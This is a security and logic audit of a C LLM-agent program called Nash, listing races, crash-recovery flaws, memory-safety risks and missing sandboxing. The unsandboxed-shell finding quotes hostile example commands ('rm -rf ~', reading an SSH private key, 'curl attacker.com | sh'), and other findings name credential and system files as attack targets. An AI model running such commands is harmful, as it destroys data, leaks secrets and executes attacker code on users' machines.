# Nash Logical Flaws Audit

## CRITICAL

### 1. Data race on `static infer_args_t` (main.c:452)

`iargs` is `static` inside the TUI block. Main thread writes to it, inference
thread reads it — no synchronization on the struct assignment itself:

```c
static infer_args_t iargs;
// ...
iargs = (infer_args_t){ .react = &react, .query = strdup(submitted_query),
                         .ui = ui, .result = NULL, .done = 0 };
pthread_create(&infer_tid, NULL, infer_worker, &iargs);
```

Struct assignment is not atomic. The thread can start reading while main thread
is still writing. No memory barrier or mutex protects the transition.

**Impact:** Thread sees partially-initialized fields → segfault or stale pointer.

---

### 2. Checkpoint restore context pollution (react.c:checkpoint_restore)

`checkpoint_restore` rebuilds conversation history from journal entries but:

- Only replays entries from `saved_loop`, skipping cross-loop context
- Adds **fresh** system prompt, manifest, memory index, scratchpad — then
  replays old tool calls with stale aliases (R0S1, R0S2) that may point to
  different content than what was originally seen
- If crash happened mid-step, partial journal entries create malformed
  conversation (tool-call without result, or result without call)
- `saved_step` is used as `ctx->tools->step` but the replayed messages may not
  correspond to that step number

**Impact:** Resumed tasks produce incoherent results or fail with 400 errors.

---

### 3. `/fork` uses wrong `react_loop` for symlink copying (main.c:525-537)

```c
for (int i = 0; i <= fork_step + 5; i++) {
    snprintf(ref, sizeof(ref), "R%dS%d", tools.react_loop, i);
    // copies session_dir/R<N>S* symlinks to new_dir/
}
```

Uses `tools.react_loop` (current loop, e.g., 3) to construct refs, but the
symlinks to copy are from **earlier** loops (R0S0, R0S1, ..., R2S5). The fork
tries to copy `R3S0`, `R3S1`, etc. — which don't exist — instead of the actual
symlinks.

**Impact:** Forked sessions have broken references. LLM cannot read prior results.

---

### 4. Context eviction breaks tool_calls threading (react.c:805-870)

After eviction, code scans backwards for the last `tool_calls_json` message:

```c
for (int ri = chat->n_msgs - 1; ri >= 0; ri--) {
    if (chat->msgs[ri].tool_calls_json) {
        chat->last_tool_calls_json = strdup(chat->msgs[ri].tool_calls_json);
        if (ri + 1 < chat->n_msgs && chat->msgs[ri + 1].tool_call_id)
            chat->last_tool_call_id = strdup(chat->msgs[ri + 1].tool_call_id);
        break;
    }
}
```

Problem: eviction removes messages from the middle. The recovered
`last_tool_call_id` may reference a tool-call message that was evicted, or the
pairing between assistant tool-call and tool result may be broken. The LLM
server rejects unmatched tool_call_ids with 400.

**Impact:** After eviction, LLM calls fail with 400 errors.

---

### 5. Fragile double-free risk in LLM streaming retry (llm.c:llm_complete_stream)

The retry loop reuses `sse_state_t st` on the stack. Between attempts:

```c
str_clear(&st.full_content);  // frees st.full_content.data
// ... curl performs ...
// If success:
result = str_steal(&st.full_content);  // takes ownership, sets .data = NULL
// Loop continues or breaks...
```

After the loop, cleanup unconditionally calls:
```c
str_free(&st.full_content);  // free(NULL) — safe
str_free(&st.tool_call_name);
str_free(&st.tool_call_args);
free(st.tool_call_id);
```

When `has_tool_call` is true, `tool_call_name` and `tool_call_args` data is
copied into cJSON strings (not stolen), so cleanup frees them correctly.
When `has_tool_call` is false, `full_content` is stolen into `result`, and
`str_free(NULL)` is safe.

**Verdict: LOW — the cleanup is actually safe, but the code is fragile and
hard to reason about. A future change could easily introduce a double-free.**

---

## HIGH

### 6. File race on journal.jsonl (react.c + journal.c)

`journal_append` uses `flock(LOCK_EX)` per write. `journal_manifest` uses
`flock(LOCK_SH)` for the entire read. Between `fclose` (releases lock) and the
next `fopen` (acquires lock), another writer can interleave. The TUI auto-refresh
(1-second interval during inference) creates a window for torn reads.

Additionally, `journal_manifest` holds `LOCK_SH` while parsing every line —
blocking the inference thread's writes for the entire duration.

**Impact:** Potential torn reads (incomplete JSON lines). Lock contention.

---

### 7. Store save silently fails with O_EXCL (store.c:52-60)

```c
int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0644);
if (fd >= 0) {
    write(fd, content, clen);  // return value NOT checked
    close(fd);
}
return hex;  // returns hash even if open() failed (EEXIST for dedup)
```

`write()` return value unchecked — partial write leaves truncated file.
`O_EXCL` failure (EEXIST for dedup) is silently ignored, which is intentional,
but the function returns the hash regardless.

**Impact:** Truncated store files from interrupted writes.

---

### 8. Shell injection — no sandboxing (tools.c:tool_shell_exec)

```c
char *argv[] = { "sh", "-c", (char *)command, NULL };
```

LLM can execute arbitrary commands: `rm -rf ~`, `cat ~/.ssh/id_rsa`,
`curl attacker.com | sh`, etc. No chroot, no seccomp, no capability dropping.

**Impact:** Full system compromise.

---

### 9. File write — no path validation (tools.c:tool_file_write)

```c
FILE *f = fopen(path, "w");
```

LLM can write to any path: `/etc/crontab`, `~/.ssh/authorized_keys`, system
binaries, etc.

**Impact:** Arbitrary file writes.

---

### 10. `strtok` thread safety (tools.c:tool_memory_store)

```c
char *tok = strtok(tags_copy, ",");
while (tok && n_tags < 32) {
    tok = strtok(NULL, ",");
}
```

`strtok` uses static internal state. Not thread-safe. Use `strtok_r`.

**Impact:** Data corruption in multi-threaded scenarios.

---

### 11. SSRF: `web_fetch` follows redirects without protocol restriction (tools.c)

```c
curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
```

No `CURLOPT_REDIR_PROTOCOLS` restriction. Malicious redirect to
`file:///etc/passwd` or `gopher://` is possible.

**Impact:** Local file disclosure, SSRF attacks.

---

### 12. Symlink race: reads follow symlinks without `O_NOFOLLOW` (tools.c)

`stat()` follows symlinks. Between `stat` check and `fopen` read, symlink
target can be replaced (TOCTOU). Alias symlinks in session directory can be
replaced by an attacker.

**Impact:** Symlink-based path traversal.

---

### 13. `memory_load_pinned` / `memory_build_index` do full directory scan on every call (memory.c)

Every `react_run` scans the entire memory directory, parses every JSON file.
O(n) disk I/O per LLM call.

**Impact:** Performance degradation as memory grows.

---

## MEDIUM

### 14. cJSON sprintf off-by-one (cJSON.c:1063)

```c
sprintf((char*)output_pointer, "u%04x", *input_pointer);
output_pointer += 4;  // BUG: "u%04x" writes 5 chars, not 4
```

`"u%04x"` produces 5 characters (e.g., `u00e9`). Advancing by 4 leaves 1 byte
unwritten, causing 1-byte misalignment for all subsequent output.

**Impact:** Malformed JSON for strings with non-ASCII characters.

---

### 15. `atoi` for `fork_step` with no validation (main.c:502)

```c
int fork_step = atoi(submitted_query + 6);
```

No error handling. `/fork abc` → 0 (fails check). `/fork 999999999` → creates
empty forked session. No warning to user.

**Impact:** Silent misbehavior.

---

### 16. Duplicate `THINKING_UNSET` definitions (config.h:13-15)

Defined three times with same value. Harmless but code quality issue.

---

### 17. Missing `#include <stdarg.h>` in str.c

`str_appendf` uses `va_list` family but doesn't include `<stdarg.h>`. Works
because `<stdio.h>` transitively includes it on most implementations.

**Impact:** Compilation failure on some platforms.

---

### 18. `volatile int done` is not atomic (main.c:infer_args_t)

```c
volatile int done;
```

`volatile` ≠ atomic. On weakly-ordered architectures, main thread could
never see the update. Should use `atomic_int` with `ATOMIC_FLAG_INIT`.

**Impact:** Potential infinite loop on ARM/PowerPC.

---

### 19. `/dream` session directory never cleaned up (main.c:679)

```c
free(dream_dir);  // frees string, NOT the directory
```

`free(dream_dir)` frees the string but doesn't `rmdir` the directory or delete
its contents (journal.jsonl, symlinks, store files, scratchpad).

**Impact:** Disk space leak. Sessions directory grows unboundedly.

---

### 20. `cJSON_AddItemReferenceToObject` ownership confusion (journal.c:36)

```c
if (params) cJSON_AddItemReferenceToObject(entry, "params", params);
```

`cJSON_AddItemReferenceToObject` creates a shallow copy with `cJSON_IsReference`
flag. When `cJSON_Delete(entry)` is called, it does NOT free the referenced
children. The caller correctly frees `params` after `journal_append` returns.
However, if journal entries are ever re-parsed and the reference is accessed
after the original `params` was freed, it's a use-after-free.

**Impact:** Potential use-after-free in edge cases.

---

### 21. `checkpoint_save` writes `last_tc_id` but `checkpoint_restore` never reads it (react.c)

```c
// checkpoint_save:
if (last_tc_id) cJSON_AddStringToObject(cp, "last_tc_id", last_tc_id);

// checkpoint_restore: never reads "last_tc_id"
```

Tool_call threading state is not restored after crash recovery.

**Impact:** Tool_calls threading broken after crash recovery.

---

## VERIFIED FALSE (not bugs)

### A. `tool_register_alias` use-after-free after grow (tools.c)

`alias_map_grow()` only reallocates `map->buckets` (the bucket array). Nodes and
their `alias`/`hash` strings (allocated with `strdup`/`malloc`) remain at the
same addresses. Returned `node->alias` pointer stays valid.

### B. `sprintf` with malloc'd buffers (react.c)

`malloc(strlen(input) + 64)` with format adding ~16 chars. Safe.

### C. `utf8_truncate` implementation (str.c)

Correctly handles all 1-4 byte UTF-8 sequences. Verified.

### D. `strcat` on fixed buffers (tools.c)

`utf8_truncate(preview, ..., 200)` + `strcat("...")` = 204 bytes in 256-byte
buffer. Safe.
